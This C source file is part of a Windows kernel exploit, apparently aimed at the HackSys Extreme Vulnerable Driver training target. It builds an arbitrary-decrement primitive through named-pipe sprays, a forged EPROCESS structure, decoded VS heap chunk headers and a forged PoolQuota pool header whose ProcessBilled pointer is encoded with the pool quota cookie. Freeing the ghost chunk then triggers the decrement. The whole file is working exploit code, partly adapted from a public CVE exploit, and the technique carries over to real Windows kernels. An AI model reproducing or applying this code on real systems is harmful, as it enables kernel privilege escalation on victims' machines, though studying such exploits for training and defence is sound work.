#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_decrement.h"

#include "primitives/arbitrary_read.h"
#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

uintptr_t allocFakeEprocess(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs, char* fake_eprocess_buf)
{
    uintptr_t fake_eprocess_attribute;
    // The pipe queue entry list is corrupted, use the pipe attribute to store arbitrary data in the kernel
    SetPipeAttribute(ghost_pipe, fake_eprocess_buf, DUMB_ATTRIBUTE_NAME_LEN + (FAKE_EPROCESS_SIZE * 2));

    // We can read prev or next of the root to find the attribute that contains the arbitrary data
    ArbitraryRead(ghost_pipe, addrs->leak_root_attribute + 0x8, (char*)&fake_eprocess_attribute, 0x8);
    printf("[+] fake_eprocess_attribute: 0x%llx\n", fake_eprocess_attribute);

    // The data of the fake EPROCESS is at fake_eprocess_attribute->AttributeValue
    uintptr_t fake_eprocess;
    ArbitraryRead(ghost_pipe, fake_eprocess_attribute + 0x20, (char*)&fake_eprocess, 0x8);
    return fake_eprocess;
}

int setupFakeEprocessAttribute(char* fake_eprocess_attribute, uintptr_t addr_to_decrement)
{
    char fake_eprocess_buf[0x1000] = { 0 };

    // Set attribute name
    strcpy_s(fake_eprocess_attribute, DUMB_ATTRIBUTE_NAME_LEN, DUMB_ATTRIBUTE_NAME);

    /* initFakeEprocess
    from: https://github.com/cbayet/Exploit-CVE-2017-6008/blob/95ee99c7/Win10/src/CVE-2017-6008_Win10_Exploit.cpp#L205-L232*/
    memset((PVOID)fake_eprocess_buf, 0x41, FAKE_EPROCESS_SIZE);

    PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + FAKE_EPROCESS_OFFSET);

    memset((char*)addr - 0x40, 0xA, 0x40);
    memset((char*)addr - 0x18, 0xB, 0x1);

    memset(addr, 0x3, 1);

    // Set address to decrement in fake structure
    memcpy((char*)addr + EPROCESS_QUOTA_BLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));
    /* end of initFakeEprocess */

    // Copy prepared fake EPROCESS to attribute buffer
    memcpy(fake_eprocess_attribute + DUMB_ATTRIBUTE_NAME_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);

    return 1;
}

int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    ArbitraryRead(pipes->ghost_pipe, addrs->kernel_base + nt_RtlpHpHeapGlobals_OFFSET, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
    printf("[+] RtlpHpHeapGlobals: 0x%llx\n", addrs->RtlpHpHeapGlobals);

    puts("[*] Searching for allocated VS header to locate subsegment...");
    size_t vs_header_addr = addrs->ghost_chunk - POOL_HEADER_SIZE + NEXT_CHUNK_OFFSET;
    addrs->vs_sub_segment = 0;
    do
    {
        uint64_t encoded_vs_header[2];
        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;

        ArbitraryRead(pipes->ghost_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
        ArbitraryRead(pipes->ghost_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));

        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;

        printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);

        if (vs_header->Allocated)
        {
            addrs->vs_sub_segment = vs_header_addr - (vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
            printf("[+] vs_sub_segment: 0x%llX\n", addrs->vs_sub_segment);
        }

        vs_header_addr += vs_header->UnsafeSize * 0x10;
    } while (!addrs->vs_sub_segment);

    // Clean up previous pipe sprays
    if (pipes->fake_pool_header)
    {
        CleanupPipeSpray(pipes->fake_pool_header);
        pipes->fake_pool_header = NULL;
    }

    if (pipes->fake_pipe_queue_entry)
    {
        CleanupPipeSpray(pipes->fake_pipe_queue_entry);
        pipes->fake_pipe_queue_entry = NULL;
    }

    return 1;
}

int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
{
    // Prepare fake EPROCESS attribute
    char fake_eprocess_attribute[0x1000] = { 0 };
    setupFakeEprocessAttribute(fake_eprocess_attribute, addr_to_decrement - 0x1);

    // Allocate and locate fake EPROCESS
    addrs->fake_eprocess = allocFakeEprocess(pipes->ghost_pipe, addrs, fake_eprocess_attribute);
    printf("[+] Fake EPROCESS address: 0x%llX\n", addrs->fake_eprocess);

    puts("[*] Setting up _HEAP_VS_CHUNK_HEADER");
    size_t ghost_chunk_vs_header = addrs->ghost_chunk - POOL_HEADER_SIZE;
    uint64_t new_encoded_vs_header[2] = { 0 };
    HEAP_VS_CHUNK_HEADER* new_vs_header = (HEAP_VS_CHUNK_HEADER*)&new_encoded_vs_header;
    new_vs_header->Allocated = 0x1;
    new_vs_header->UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
    new_vs_header->UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
    new_vs_header->EncodedSegmentPageOffset = (ghost_chunk_vs_header - addrs->vs_sub_segment) >> 12 & 0xff;
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;

    puts("[*] Spraying pipes with fake ProcessBilled...");
    char fake_pool_quota_attribute[0x1000];
    memset(fake_pool_quota_attribute, 0x46, sizeof(fake_pool_quota_attribute));

    // set vs chunk header
    *(uint64_t*)((unsigned char*)fake_pool_quota_attribute) = new_encoded_vs_header[0];
    *(uint64_t*)((unsigned char*)fake_pool_quota_attribute + 8) = new_encoded_vs_header[1];

    // Configure pool header for arbitrary decrement
    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET) = 0;                // Previous size
    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 1) = 0;            // Pool index
    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 2) = 0x100 / 0x10; // Block size (0x100 bytes)
    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 3) = 8;            // Pool type (PoolQuota)

    // Set pool tag (ABCD)
    *(uint32_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 4) = 0x41424344;

    // Configure quota value for arbitrary decrement
    // XOR operation is key to controlling the ProcessBilled field
    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 8) =
        (addrs->fake_eprocess + FAKE_EPROCESS_OFFSET) ^ addrs->ExpPoolQuotaCookie ^ addrs->ghost_chunk;

    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x10) = addrs->leak_root_queue;
    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x18) = addrs->leak_root_queue;
    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x20) = (uintptr_t)0;
    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x28) = (uintptr_t)0;
    *(unsigned long*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x38) = (unsigned long)0;
    *(unsigned long*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x3c) = (unsigned long)0;

    pipes->fake_pool_quota = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE, fake_pool_quota_attribute);
    PerformPipeSpray(pipes->fake_pool_quota);

    puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
    FreeNPPNxChunk(pipes->ghost_pipe, GHOST_CHUNK_BUFSIZE);

    return 1;
}
